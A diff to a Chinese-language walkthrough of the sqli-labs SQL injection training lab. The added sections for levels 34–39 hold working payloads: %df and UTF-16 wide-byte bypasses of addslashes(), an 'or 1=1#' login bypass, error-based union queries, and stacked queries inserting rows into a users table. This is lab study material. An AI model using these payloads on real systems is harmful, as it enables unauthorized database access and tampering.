@@ -12,7 +12,7 @@ hackbar mod by Shariq Malik
 
 mysql的版本调到5.5以上，因为这样你的数据库内才会有information_schema数据库
 
-部分 关卡（Less 29 - Less 31）需要 双服务器，tomcat+jsp
+**部分 关卡（Less 29 - Less 31）需要 双服务器，tomcat+jsp**,配置如下：
 
 wget https://mirrors.aliyun.com/apache/tomcat/tomcat-8/v8.5.50/bin/apache-tomcat-8.5.50.tar.gz
 
@@ -82,7 +82,8 @@ admin' or 1=1#
 同理
 
 	--空格 等价于 --%20
-	 # 要用 %23
+
+	# 要用 %23
 
 
 
@@ -464,7 +465,7 @@ mysql 查询
 
 原理：
 
-**宽字节注入指的是mysql数据库在使用宽字节（GBK）编码时，会认为两个字符是一个汉字（前一个ascii码要大于128（比如%df），才到汉字的范围。 [16进制和ascii互转对照表](https://www.mokuge.com/tool/asciito16/)，而且当我们输入单引号时，mysql会调用转义函数，将单引号变为\'，其中\的十六进制是%5c,mysql的GBK编码，会认为%df%5c是一个宽字节，也就是'運'，从而使单引号闭合（逃逸），进行注入攻击**
+**宽字节注入指的是mysql数据库在使用宽字节（GBK）编码时，会认为两个字符是一个汉字（前一个ascii码要大于128（比如%df，也可以是大于128的任意其他字符），才到汉字的范围。 [16进制和ascii互转对照表](https://www.mokuge.com/tool/asciito16/)，而且当我们输入单引号时，mysql会调用转义函数，将单引号变为\'，其中\的十六进制是%5c,mysql的GBK编码，会认为%df%5c是一个宽字节，也就是'運'，从而使单引号闭合（逃逸），进行注入攻击**
 
 %df%27===>(addslashes)====>%df%5c%27====>(GBK)====>運’
 
@@ -492,6 +493,103 @@ payload
 ![](Less-32.jpg)
 
 [宽字节注入 参考资料](https://mp.weixin.qq.com/s?__biz=MzI4NjEyMDk0MA==&mid=2649847208&idx=1&sn=f207b86cd17135edd66470175d4a26fe&chksm=f3e41b2bc493923daa7d6401d3f15cb65cfd6be5dcdd61bed6081259dbd59c28e3fd8ae1bd49&scene=21#wechat_redirect)
+
+##### 34关 post型 Bypass addslashes()
+
+![](Less-34.jpg)
+
+GET型的方式我们是以url形式提交的，因此数据会通过urlencode
+
+POST型的方式
+
+可以将UTF-8转换为UTF-16或者UTF-32,例如将 ```'``` 转换为utf-16为： �'  (我也不知道咋转的 :) ，使用的时候直接复制 ```�``` 吧
+https://blog.csdn.net/s634772208/article/details/83715382
+https://www.qqxiuzi.cn/bianma/Unicode-UTF.php)
+
+在 输入框里填入基于宽字节改动的万能密码：
+
+username： �'or 1=1#
+
+![](Less-34-2.jpg)
+
+或手动发送宽字节注入包：
+
+![](Less-34-3.jpg)
+
+![](Less-34-4.jpg)
+
+水平越权
+
+![](Less-34-5.jpg)
+
+![](Less-34-6.jpg)
+
+报错注入
+
+	uname=-1%df' union select count(*), concat((select database()), floor(rand()*2))as a from information_schema.tables group by a#&passwd=
+
+回显为如下两种情况
+
+![](Less-34-7.jpg)
+
+![](Less-34-8.jpg)
+
+据说还可以用post型盲注通杀payload，我这里测试未成功
+
+##### 36关
+
+可使用宽字节 %df 或者utf-16
+	
+	payload:  ?id=-1%df'or 1=1 -–+
+
+![](Less-36.jpg)
+
+	payload:  ?id=-1�' union select 1,user(),3 --+
+
+![](Less-36-2.jpg)
+
+
+mysql_real_escape_string() 函数转义 SQL 语句中使用的字符串中的特殊字符。
+
+下列字符受影响：
+
+    \x00
+    \n
+    \r
+    \
+    '
+    "
+    \x1a
+
+##### 37关
+	
+	�' union select count(*), concat((select database()), floor(rand()*2))as a from information_schema.tables group by a#
+
+##### 38关 stacked Query 堆叠查询
+
+	-1%df%27union select 1,@@version,3--+
+
+![](Less-38.jpg)
+
+
+	-1%df'union select 1,@@version,3;insert into users values(114,'1111','123') --+
+
+![](Less-38-2.jpg)
+
+数据库变化：
+
+![](Less-38-3.jpg)
+
+
+后台代码：
+
+	/* execute multi query */
+	mysqli_multi_query($con1, $sql)
+
+##### 39关 stacked Query 堆叠查询
+
+	-1 union select 1,@@version,3;insert into users values(115,'1111','123') --+
+
 
 ## sqlmap 一些语法
 	
@@ -551,3 +649,12 @@ sqlmap跑不出来需要手工注入的情况？
 
 [过waf](https://www.2cto.com/article/201409/331545.html)
 
+
+
+
+
+
+
+
+
+Level 42
